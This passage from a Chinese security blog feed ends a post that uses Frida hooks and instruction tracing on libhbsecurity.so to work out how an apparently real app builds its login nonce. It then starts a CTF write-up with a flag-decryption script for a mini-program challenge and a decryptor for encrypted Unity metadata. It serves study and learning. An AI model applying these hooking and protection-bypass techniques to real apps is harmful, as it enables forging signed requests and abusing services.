this.params = [];        var prefix = &quot;call &quot;;        if (module) &#123;          prefix += module.name + &quot;!&quot; + ptr(funcPtr).sub(module.base) + &quot;\n&quot;;        &#125; else &#123;          prefix += ptr(funcPtr) + &quot;\n&quot;;        &#125;        this.logs.push(prefix);        for (let i = 0; i &lt; paramsNum; i++) &#123;          this.params.push(args[i]);          this.logs.push(&quot;arg[&quot; + i + &quot;] onEnter: &quot; + print_arg(args[i]));        &#125;      &#125; catch (e) &#123;        console.error(&quot;onEnter error:&quot;, e);      &#125;    &#125;,    onLeave: function (retval) &#123;      try &#123;        for (let i = 0; i &lt; paramsNum; i++) &#123;          this.logs.push(&quot;arg[&quot; + i + &quot;] onLeave: &quot; + print_arg(this.params[i]));        &#125;        this.logs.push(&quot;retval: &quot; + print_arg(retval));        console.log(this.logs.join(&quot;\n&quot;));        console.log(&quot;================================&quot;);      &#125; catch (e) &#123;        console.error(&quot;onLeave error:&quot;, e);      &#125;    &#125;  &#125;);&#125;function hook_so_native_method() &#123;  var soAddr = Module.findBaseAddress(&quot;libhbsecurity.so&quot;);  if (!soAddr) &#123;    console.error(&quot;libhbsecurity.so not found&quot;);    return;  &#125;  var funcAddr = soAddr.add(0xA2B50);  hook_native_addr(funcAddr, 3);&#125;</code></pre><p>​从日志内容中没找到比较明显的加密字符串返回，故猜测这里不是一个一个加密逻辑的点。然后再往后分析，看到 v6 是对 v5 处理后的结果，同样 hook 一下看看。</p><pre><code class="language-js">function print_arg(addr) &#123;  if (addr.isNull &amp;&amp; addr.isNull()) return &quot;NULL\n&quot;;  var range = Process.findRangeByAddress(addr);  if (range !== null) &#123;    return hexdump(addr, &#123;length: 64&#125;) + &quot;\n&quot;;  &#125;  return ptr(addr).toString() + &quot;\n&quot;;&#125;function hook_native_addr(funcPtr, paramsNum) &#123;  var module = Process.findModuleByAddress(funcPtr);  Interceptor.attach(funcPtr, &#123;    onEnter: function (args) &#123;      try &#123;        this.logs = [];        this.params = [];        var prefix = &quot;call &quot;;        if (module) &#123;          prefix += module.name + &quot;!&quot; + ptr(funcPtr).sub(module.base) + &quot;\n&quot;;        &#125; else &#123;          prefix += ptr(funcPtr) + &quot;\n&quot;;        &#125;        this.logs.push(prefix);        for (let i = 0; i &lt; paramsNum; i++) &#123;          this.params.push(args[i]);          this.logs.push(&quot;arg[&quot; + i + &quot;] onEnter: &quot; + print_arg(args[i]));        &#125;      &#125; catch (e) &#123;        console.error(&quot;onEnter error:&quot;, e);      &#125;    &#125;,    onLeave: function (retval) &#123;      try &#123;        for (let i = 0; i &lt; paramsNum; i++) &#123;          this.logs.push(&quot;arg[&quot; + i + &quot;] onLeave: &quot; + print_arg(this.params[i]));        &#125;        this.logs.push(&quot;retval: &quot; + print_arg(retval));        console.log(this.logs.join(&quot;\n&quot;));        console.log(&quot;================================&quot;);      &#125; catch (e) &#123;        console.error(&quot;onLeave error:&quot;, e);      &#125;    &#125;  &#125;);&#125;function hook_so_native_method() &#123;  var soAddr = Module.findBaseAddress(&quot;libhbsecurity.so&quot;);  if (!soAddr) &#123;    console.error(&quot;libhbsecurity.so not found&quot;);    return;  &#125;  var funcAddr = soAddr.add(0x728A4);  hook_native_addr(funcAddr, 1);&#125;</code></pre><p>​打印出来的日志都是一些空值，都没啥用，可能是指针的一些值，不能直接用 hexdump 打印出来，那就继续看看 v6 又进行了哪些处理。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107113211197.png" alt="image-20251107113211197"></p><p>​继续 hook 查看。不知道为什么，我在 hook <strong>sub_A6620</strong> 时，返回值依旧是指针的值，hexdump 打印不出来，不知道文章中的作者是咋写的 hook 的脚本…</p><p>​跟进该函数，明显有问题。</p><pre><code class="language-c">__int64 sub_A6620()&#123;  __int64 v0; // x19  unsigned __int8 v1; // w8  __int64 result; // x0  v0 = sub_72AE4(33LL);  *v0 = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 1) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 2) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 3) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 4) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 5) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 6) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 7) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 8) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 9) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 10) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 11) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 12) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 13) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 14) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 15) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 16) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 17) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 18) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 19) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 20) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 21) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 22) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 23) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 24) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 25) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 26) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 27) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 28) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 29) = byte_230F4[sub_4AC1C(62LL)];  *(v0 + 30) = byte_230F4[sub_4AC1C(62LL)];  v1 = byte_230F4[sub_4AC1C(62LL)];  result = v0;  *(v0 + 31) = v1;  return result;&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107143252403.png" alt="image-20251107143252403"></p><p>​这里面又有一个函数 <strong>sub_4AC1C</strong>，hook 一下看看。貌似产生的都是一些“随机”数。</p><p>​根据文章作者对 sub_A6620 函数结果的 hook，以及跟进之后对 sub_4AC1C 函数的 hook，可以确定一个映射关系。同时也可以进行验证。</p><ul><li>大写字母：偏移 0x1D    </li><li>小写字母：偏移 0x57     </li><li>数字：偏移 0x30</li></ul><h4 id="2、getVD"><a href="#2、getVD" class="headerlink" title="2、getVD"></a>2、getVD</h4><p>​依旧在 <strong>JNI_OnLoad</strong> 函数中的动态注册函数的结构体中找该函数。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111094647993.png" alt="image-20251111094647993"></p><p>​跟进查看逻辑。发现有控制流混淆，然后就跟着文章中的 trace 项目进行 trace 了一下。</p><ul><li><p>项目地址：<a href="https://github.com/bmax121/sktrace">https://github.com/bmax121/sktrace</a> </p></li><li><p>参考文章：<a href="https://bbs.kanxue.com/thread-264680.htm">https://bbs.kanxue.com/thread-264680.htm</a> </p></li><li><p>运行指令：python sktrace.py -m attach -l libhbsecurity.so -i 0xA5E44 *黑盒 &gt; xhh1.log</p></li></ul><p>​完了点击登录调用一下。</p><p>​可以通过 Frida脚本去 hook 方法返回值，也可以通过抓包看 nonce 的值，我这里测试时抓的值是</p><pre><code>4qhGNlfFEsjKyRmNgYbteBW2K9xEmMEF</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111110847056.png" alt="image-20251111110847056"></p><p>​然后去日志中找第一次生成的地方，直接在 日志 中搜索 347168 即可。这样就找到了第一组数组，确定是在这个函数内生成的。再搜 0x34 查找它第一个生成位置。有两个，依次留下标记。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111111138181.png" alt="image-20251111111138181"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111111211598.png" alt="image-20251111111211598"></p><p>​发现一个特征</p><pre><code>ldrb    w8, [x20, w0, uxtw]</code></pre><p>​都是在这个汇编代码里，根据地址计算一下偏移，然后去 IDA 里找</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111111301263.png" alt="image-20251111111301263"></p><p>​发现又到这了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111111320921.png" alt="image-20251111111320921"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251111111404843.png" alt="image-20251111111404843"></p><p>​在 getVD 函数里同样调用了随机生成函数 sub_A6620，既然这样，就只需要再 hook 一下这个函数调用生成的值和最后的是否一样。最终测试结果是一样的。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107150900309.png" alt="image-20251107150900309"></p><h3 id="五、结语"><a href="#五、结语" class="headerlink" title="五、结语"></a>五、结语</h3><p>​第一次较为完整的复现了一次实战文章并记录下来，体验了 trace 跟踪，并分析的这么一个过程。虽说整体过程没有很复杂，但为进一步的学习打下基础。</p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届强网·拟态防御国际精英挑战赛</title>
      <link href="/2025/10/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%C2%B7%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2025/10/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%BC%BA%E7%BD%91%C2%B7%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="第八届强网·拟态防御国际精英挑战赛"><a href="#第八届强网·拟态防御国际精英挑战赛" class="headerlink" title="第八届强网·拟态防御国际精英挑战赛"></a>第八届强网·拟态防御国际精英挑战赛</h1><h2 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h2><h3 id="EZMiniAPP"><a href="#EZMiniAPP" class="headerlink" title="EZMiniAPP"></a>EZMiniAPP</h3><p>看名字一眼就是一个小程序，直接用GitHub上的开源项目解包</p><p><a href="https://github.com/biggerstar/wedecode">biggerstar&#x2F;wedecode: 全自动化，微信小程序 wxapkg 包 源代码还原工具, 线上代码安全审计，支持 Windows, Macos, Linux</a></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251025172957543.png" alt="image-20251025172957543"></p><p>check逻辑就在chunk_0.appservice.js.map里</p><pre><code class="language-js">&#123;    &quot;version&quot;: 3,    &quot;file&quot;: &quot;&quot;,    &quot;sourceRoot&quot;: &quot;&quot;,    &quot;sources&quot;: [        &quot;pages/index/index.js&quot;    ],    &quot;names&quot;: [        &quot;Page&quot;,        &quot;data&quot;,        &quot;inputValue&quot;,        &quot;animationData&quot;,        &quot;onLoad&quot;,        &quot;a&quot;,        &quot;wx&quot;,        &quot;createAnimation&quot;,        &quot;duration&quot;,        &quot;timingFunction&quot;,        &quot;opacity&quot;,        &quot;translateY&quot;,        &quot;step&quot;,        &quot;setData&quot;,        &quot;export&quot;,        &quot;onInputChange&quot;,        &quot;detail&quot;,        &quot;value&quot;,        &quot;enigmaticTransformation&quot;,        &quot;t&quot;,        &quot;e&quot;,        &quot;n&quot;,        &quot;r&quot;,        &quot;i&quot;,        &quot;Array&quot;,        &quot;from&quot;,        &quot;map&quot;,        &quot;charCodeAt&quot;,        &quot;s&quot;,        &quot;length&quot;,        &quot;c&quot;,        &quot;o&quot;,        &quot;u&quot;,        &quot;h&quot;,        &quot;push&quot;,        &quot;customEncrypt&quot;,        &quot;onCheck&quot;,        &quot;trim&quot;,        &quot;console&quot;,        &quot;log&quot;,        &quot;JSON&quot;,        &quot;stringify&quot;,        &quot;showToast&quot;,        &quot;title&quot;,        &quot;icon&quot;    ],    &quot;mappings&quot;: &quot;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&quot;,    &quot;sourcesContent&quot;: [        &quot;\&quot;use strict\&quot;;Page(&#123;data:&#123;inputValue:\&quot;\&quot;,animationData:&#123;&#125;&#125;,onLoad:function()&#123;var a=wx.createAnimation(&#123;duration:1e3,timingFunction:\&quot;ease\&quot;&#125;);a.opacity(1).translateY(0).step(),this.setData(&#123;animationData:a.export()&#125;)&#125;,onInputChange:function(a)&#123;this.setData(&#123;inputValue:a.detail.value&#125;)&#125;,enigmaticTransformation:function(a,t)&#123;for(var e,n,r=[],i=Array.from(t).map((function(a)&#123;return a.charCodeAt(0)&#125;)),s=i.length,c=function(a)&#123;for(var t=0,e=0;e&lt;a.length;e++)switch(e%4)&#123;case 0:t+=1*a[e];break;case 1:t+=a[e]+0;break;case 2:t+=0|a[e];break;case 3:t+=0^a[e]&#125;return t&#125;(i)%8,o=0;o&lt;a.length;o++)&#123;var u=void 0;switch(o%3)&#123;case 0:u=a.charCodeAt(o)^i[o%s];break;case 1:u=i[o%s]^a.charCodeAt(o);break;case 2:e=a.charCodeAt(o),n=i[o%s],u=e^n&#125;var h=void 0;switch(c)&#123;case 0:h=u;break;case 1:h=255&amp;(u&lt;&lt;1|u&gt;&gt;7&amp;1);break;case 2:h=255&amp;(u&lt;&lt;2|u&gt;&gt;6&amp;3);break;case 3:h=255&amp;(u&lt;&lt;3|u&gt;&gt;5&amp;7);break;case 4:h=255&amp;(u&lt;&lt;4|u&gt;&gt;4&amp;15);break;case 5:h=255&amp;(u&lt;&lt;5|u&gt;&gt;3&amp;31);break;case 6:h=255&amp;(u&lt;&lt;6|u&gt;&gt;2&amp;63);break;case 7:h=255&amp;(u&lt;&lt;7|u&gt;&gt;1&amp;127);break;default:h=255&amp;(u&lt;&lt;c|u&gt;&gt;8-c)&#125;switch(o%2)&#123;case 0:r[r.length]=h;break;case 1:r.push(h)&#125;&#125;return function(a)&#123;for(var t=[],e=0;e&lt;a.length;e++)switch(e%2)&#123;case 0:case 1:t[e]=a[e]&#125;return t&#125;(r)&#125;,customEncrypt:function(a,t)&#123;return this.enigmaticTransformation(a,t)&#125;,onCheck:function()&#123;var a=this.data.inputValue;if(\&quot;\&quot;!==a.trim())&#123;var t=this.customEncrypt(a,\&quot;newKey2025!\&quot;);console.log(t),JSON.stringify(t)===JSON.stringify([1,33,194,133,195,102,232,104,200,14,8,163,131,71,68,97,2,76,72,171,74,106,225,1,65])?wx.showToast(&#123;title:\&quot;Right\&quot;,icon:\&quot;success\&quot;,duration:2e3&#125;):wx.showToast(&#123;title:\&quot;Wrong\&quot;,icon:\&quot;error\&quot;,duration:2e3&#125;)&#125;else wx.showToast(&#123;title:\&quot;请输入内容\&quot;,icon:\&quot;none\&quot;,duration:2e3&#125;)&#125;&#125;);&quot;    ]&#125;</code></pre><p>然后直接写脚本解密</p><pre><code class="language-python">#!/usr/bin/env python3# -*- coding: utf-8 -*-&quot;&quot;&quot;Decrypt script for the mini-program CTF checkAlgorithm mirrors the app&#39;s enigmaticTransformation:- u = input_byte ^ key_byte- h = rol8(u, c) where c = sum(key_bytes) % 8To decrypt: input_byte = ror8(h, c) ^ key_byte&quot;&quot;&quot;from typing import Listdef rol8(x: int, k: int) -&gt; int:    k %= 8    x &amp;= 0xFF    return ((x &lt;&lt; k) &amp; 0xFF) | (x &gt;&gt; (8 - k))def ror8(x: int, k: int) -&gt; int:    k %= 8    x &amp;= 0xFF    return ((x &gt;&gt; k) | ((x &lt;&lt; (8 - k)) &amp; 0xFF)) &amp; 0xFFdef compute_shift(key_bytes: List[int]) -&gt; int:    return sum(key_bytes) % 8def decrypt(arr: List[int], key: str) -&gt; str:    key_bytes = [ord(c) for c in key]    s = len(key_bytes)    c = compute_shift(key_bytes)    out_chars = []    for o, h in enumerate(arr):        u = ror8(h, c)        ch = u ^ key_bytes[o % s]        out_chars.append(chr(ch))    return &#39;&#39;.join(out_chars)def encrypt(plain: str, key: str) -&gt; List[int]:    key_bytes = [ord(c) for c in key]    s = len(key_bytes)    c = compute_shift(key_bytes)    out = []    for o, ch in enumerate(plain):        u = ord(ch) ^ key_bytes[o % s]        h = rol8(u, c)        out.append(h)    return outif __name__ == &#39;__main__&#39;:    target_arr = [        1, 33, 194, 133, 195, 102, 232, 104, 200, 14,        8, 163, 131, 71, 68, 97, 2, 76, 72, 171,        74, 106, 225, 1, 65    ]    key = &#39;newKey2025!&#39;    plain = decrypt(target_arr, key)    print(plain)    reenc = encrypt(plain, key)    assert reenc == target_arr, &#39;Re-encryption mismatch!&#39;</code></pre><p>flag{JustEasyMiniProgram}</p><h3 id="just"><a href="#just" class="headerlink" title="just"></a>just</h3><p>​一开始用 <strong>Il2CppDumper</strong> 的时候报错，</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028103040872.png" alt="image-20251028103040872"></p><p>​然后发现so被加密了，于是就开始找解密的地方。最开始想着想在程序运行的时候dump下来，但是发现好像有Frida 检测，并且也dump不下来，那就只能去看其他的so了。</p><p>​在libjust.so 中，通过可疑字符串定位到解密函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028103457455.png" alt="image-20251028103457455"></p><p>可以看到应该是一个rc4，密钥是nihaounity</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028103646709.png" alt="image-20251028103646709"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028103842659.png" alt="image-20251028103842659"></p><p>尝试解密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028103852791.png" alt="image-20251028103852791"></p><p>​然后再次 Il2CppDumper 还是报错，那就是 global-metadata.dat 的问题了，010打开查看确实有问题（光看头确实没啥问题，但是往下多看看就发现有问题了）</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028104029722.png" alt="image-20251028104029722"></p><p>​还是通过字符串去解密出来的 libil2cpp.so 里搜</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028104736964.png" alt="image-20251028104736964"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028104816842.png" alt="image-20251028104816842"></p><p>​跟进 sub_211D94 ，然后继续找解密逻辑，如下</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028105035325.png" alt="image-20251028105035325"></p><p>​丢给ai写了个脚本解密</p><pre><code class="language-python">import structdef sub_21A2C8(src: bytes, a2: int) -&gt; bytes:    # 确保长度足够    if len(src) &lt; 1026 * 2:        raise ValueError(&quot;src too short&quot;)    # src 是 16-bit little endian 数组    u16 = list(struct.unpack(&quot;&lt;&quot; + &quot;H&quot; * (len(src) // 2), src))    v2 = u16[512]    v4 = a2 - 4 * v2    v5 = v4 - 1028    dest_size = v4 - 4    dest = bytearray(dest_size)    # 拷贝前 0x400 字节（512 * 2）    dest[:0x400] = src[:0x400]    if v5 &gt;= 1:        for i in range(0, v5, 4):            v8 = i if i &gt;= 0 else i + 3            v9 = i + i // v2            base_offset = (v8 &amp; ~3) + 1024            src_data_off = (2 * v2 + 514) * 2 + (v8 &amp; ~3)            key_off = (2 * (v9 % v2) + 514) * 2            if src_data_off + 4 &lt;= len(src) and key_off + 4 &lt;= len(src):                data_val = struct.unpack_from(&quot;&lt;I&quot;, src, src_data_off)[0]                key_val = struct.unpack_from(&quot;&lt;I&quot;, src, key_off)[0]                res = data_val ^ key_val                struct.pack_into(&quot;&lt;I&quot;, dest, base_offset, res)    return bytes(dest)# 假设你从文件中读取了加密数据：with open(&quot;global-metadata.dat&quot;, &quot;rb&quot;) as f:    src_data = f.read()# a2 一般是文件总长度（比如 len(src_data)）result = sub_21A2C8(src_data, len(src_data))with open(&quot;decrypted.bin&quot;, &quot;wb&quot;) as f:    f.write(result)</code></pre><p>​然后就可以使用 Il2CppDumper 一把梭了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028105653428.png" alt="image-20251028105653428"></p><p>​接下俩就是主要对 FlagChecker类进行分析了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028105920299.png" alt="image-20251028105920299"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028111848917.png" alt="image-20251028111848917"></p><p>​然后根据偏移去找加密逻辑。一个魔改的tea</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028111902797.png" alt="image-20251028111902797"></p><p>​然后继续找密文和密钥，可以去构造函数里找找</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251028112821074.png" alt="image-20251028112821074"></p><p>​把 libil2Cpp.so 符号恢复一下，ida 依次导入脚本 ida_with_struct_py3.py -&gt; script.json -&gt; il2cpp.h，即可。</p><pre><code class="language-c">void __fastcall FlagChecker___cctor(const MethodInfo *method)&#123;  unsigned __int64 v1; // d0  unsigned __int64 v2; // d1  int n9; // w8  